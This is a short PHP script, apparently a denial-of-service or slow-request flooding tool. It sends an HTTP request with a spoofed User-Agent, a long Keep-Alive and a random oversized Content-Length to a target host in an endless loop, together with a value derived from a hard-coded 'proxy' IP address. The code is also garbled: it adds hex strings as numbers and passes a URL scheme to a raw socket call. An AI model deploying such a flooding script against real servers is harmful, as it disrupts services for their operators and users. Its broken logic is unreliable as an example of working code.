<?php
$_SERVER['HTTP_HOST'] = "127.0.0.1";
$_SERVER['SERVER_ADDR'] = "127.0.0.1";//80000001
$proxy = "85.143.50.69";
$my = explode('.', $proxy);
$s[0] = dechex($my[0]);
$s[1] = dechex($my[1]);
$s[2] = dechex($my[2]);
$s[3] = dechex($my[3]);
$str = $s[0]+$s[1]+$s[2]+$s[3];
$data = 0x4f000ffff00000000ff040017+$str+80000001;
//ip of target to hex
$host = "127.0.0.1";
$port = 80;

$request = "GET "."/".md5(rand(0, 9999999999))." HTTP/1.1\r\n";
$request .= "Host: $host\r\n";
$request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
$request .= "Keep-Alive: 900\r\n";
$request .= "Content-Length: " . rand(10000, 1000000) . "\r\n";
$request .= "Accept: *.*\r\n";
$request .= "X-a: " . rand(1, 10000) . "\r\n";
echo $_SERVER['REMOTE_ADDR'];

while (true){
	$sock = fsockopen("https://".$host,$port);
	fwrite($sock, $data.$request);
	fclose($sock);
	sleep(5);
}

?>